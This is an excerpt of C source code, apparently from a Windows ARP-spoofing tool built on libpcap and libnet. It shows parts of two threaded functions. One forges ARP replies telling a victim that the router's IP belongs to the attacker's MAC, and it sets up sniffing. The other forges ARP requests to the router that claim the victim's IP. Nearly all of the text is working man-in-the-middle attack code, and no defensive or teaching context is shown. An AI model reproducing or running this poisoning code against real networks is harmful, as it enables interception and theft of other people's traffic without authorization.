...
DWORD WINAPI sending_vic_reply(void *arg) {
	...
	int i, j;
	char buf[32] = { 0, };
	u_char *vic_data = (u_char*)malloc(sizeof(u_char) * ARP_HEADER_LEN);
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;
	while (rel_flag);
	setSniffingData(FALSE, info, target, n_target);
	for (i = 0; i < ARP_HEADER_LEN; i++) *(vic_data + i) = *(data + i);
	while (1) {
		if (rel_flag) break;
		EnterCriticalSection(&crt);
		eh = (struct libnet_ethernet_hdr *)vic_data;
		ah = (struct libnet_arp_hdr *)vic_data;

		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data + i) = target.target_mac[n_target][i];
		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(vic_data + i) = info.Host_Mac[j];
		vic_data += sizeof(*eh) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		*(vic_data + 1) = ARPOP_REPLY;
		vic_data += sizeof(ah->ar_op);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data + i) = info.Host_Mac[i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(vic_data + i) = info.Router_Ip[j];
		vic_data += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data + i) = target.target_mac[n_target][i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); j++, i++) *(vic_data + i) = target.target_ip[n_target][j];
		vic_data -= sizeof(*eh) + sizeof(ah->ar_sha) + sizeof(ah->ar_spa) + sizeof(ah->ar_op) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		if (pcap_sendpacket(fp, vic_data, ARP_HEADER_LEN) != 0) {
			printf("Error\n");
			return -1;
		}
...
DWORD WINAPI sending_rou_request(void *arg) {
	...
	while (1) {
		...
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = 0xFF;
		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(vic_data_request + i) = info.Host_Mac[j];
		...
		*(vic_data_request + 1) = ARPOP_REQUEST;
		...
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(vic_data_request + i) = target.target_ip[n_target][j];
		vic_data_request += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = 0x00;
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); j++, i++) *(vic_data_request + i) = info.Router_Ip[j];
